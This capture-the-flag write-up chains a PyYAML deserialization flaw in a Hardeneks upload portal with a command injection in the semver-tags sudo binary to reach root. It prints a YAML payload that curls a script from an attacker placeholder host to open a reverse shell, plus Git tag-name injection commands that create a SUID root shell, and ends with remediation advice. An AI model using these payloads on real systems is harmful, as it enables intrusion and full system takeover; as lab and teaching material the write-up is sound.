# CTF Writeup - Privilege Escalation via Insecure Deserialization & Command Injection

## General Information
- **Target:** EKS Audit Environment (Hardeneks) / `semverex` machine
- **Initial User:** `ETSCTF`
- **Final Privileges:** `root`
- **Primary Vectors:** 
  - Insecure Deserialization (PyYAML) -> SNYK-PYTHON-HARDENEKS-3263422
  - Permissive Sudoers + Command Injection (Node.js) -> CVE-2022-25853 (`semver-tags`)

---

## 1. Initial Access & RCE (Remote Code Execution)

### Discovery
The initial port scan revealed a web portal accessible on **port 1337**. This interface allows users to upload a configuration file to audit Amazon EKS clusters using the **Hardeneks** tool.

According to security advisory **SNYK-PYTHON-HARDENEKS-3263422**, outdated versions of this tool use PyYAML's vulnerable `yaml.load()` function to parse uploaded files, exposing the application to an **insecure deserialization flaw (CWE-502)**.

### Exploitation (Entry Vector)
By leveraging the Python object serialization tag `!!python/object/apply`, it is possible to force the server to execute arbitrary system commands when reading the YAML file.

A malicious configuration file (`exploit.yaml`) was uploaded to initiate a two-stage attack via a silent downloader:

```yaml
settings:
  cluster_name: "prod-eks-cluster"

malicious_payload: !!python/object/apply:subprocess.Popen
  - [ "/bin/sh", "-c", "curl -s http://<ATTACKER_IP>/reverse.sh -o /tmp/run.sh && chmod +x /tmp/run.sh && /tmp/run.sh" ]
```

The downloaded and executed `reverse.sh` script established a **Reverse Shell**, granting initial access to the machine with the privileges of the **`ETSCTF`** user.

---

## 2. Privilege Escalation (PrivEsc to Root)

### Local Enumeration
Once a foothold was established on the system, inspecting the privileges granted to our user via the `sudo -l` command revealed a critical configuration:

```text
User ETSCTF may run the following commands on semverex:
    (ALL) NOPASSWD: /usr/local/bin/semver-tags
```

Analyzing this binary showed that it is a symbolic link pointing to a global installation of the Node.js module `semver-tags` version **0.4.10** (`/usr/local/lib/node_modules/semver-tags/bin/semver-tags`).

This specific version is affected by **CVE-2022-25853**, an **OS command injection vulnerability (CWE-78)**. When the tool queries project versions, it passes Git tag names directly to the vulnerable `child_process.exec()` function, which invokes a `/bin/sh` shell without sanitizing the strings.

### Exploitation (Bypassing Git Syntax Restrictions)
Since the Node.js script encapsulates command-line arguments between single quotes (`'`), direct injection via the `--repo-path` argument triggered shell syntax errors. The most reliable method to exploit this flaw is to inject the payload **directly into the internal database of a local Git repository**.

1. **Initialize a legitimate Git repository** inside the user's home directory (`/home/ETSCTF`) to bypass Git's security protections regarding shared directories (`dubious ownership` restrictions in `/tmp`):
   ```bash
   touch README.md
   git config user.name 'ETSCTF'
   git config user.email 'etsctf@example.com'
   git add README.md
   git commit -m 'Initial'
   ```

2. **Create an intermediate script** containing the payload (`/tmp/x.sh`) to overcome character parsing limitations and whitespace issues within the automated CTF runner script:
   ```bash
   echo '#!/bin/sh' > /tmp/x.sh
   echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/x.sh
   chmod +x /tmp/x.sh
   ```

3. **Inject into Git metadata:** Manually write the tag reference file to insert the control characters (the semicolon `;` to close the Git command instruction and the single quotes `''` to balance the final syntax appended by Node.js):
   ```bash
   HASH=\$(git rev-parse HEAD)
   echo \$HASH > ".git/refs/tags/v1.0.0;'/tmp/x.sh';"
   ```

4. **Triggering Execution:** Run the privileged binary via `sudo` without any arguments from this specific directory. The tool scans the current repository, reads the malicious tag name, and evaluates it inside its `root` sub-shell:
   ```bash
   sudo /usr/local/bin/semver-tags
   ```

5. **Final Access:** Since the SUID binary was successfully generated in the temporary folder, executing it yields a permanent root shell:
   ```bash
   /tmp/rootbash -p
   ```
   *Status: **ROOT CONFIRMED***

---

## 3. Remediation Report (Blue Teaming)

To permanently secure this server against this specific attack chain, the following structural fixes must be applied:

1. **Fix the RCE (Hardeneks):** Upgrade the `hardeneks` package to version 0.7.2 (or higher) or modify the source code to replace `yaml.load()` strictly with **`yaml.safe_load()`**. This prevents the instantiation of complex Python objects during configuration file parsing.
2. **Enforce the Principle of Least Privilege:** Remove the `NOPASSWD` entry for the `semver-tags` utility from the `/etc/sudoers` file. A version management script does not require administrative operating system privileges to function.
3. **Secure Process Execution (Semver-tags):** Upgrade the global npm module to version 2.0.7 or higher. The fixed code utilizes `execFile()`, which passes arguments as a strictly isolated array to the operating system, completely neutralizing the evaluation of shell metacharacters (such as `;`, `&`, `|`, or `$()`).
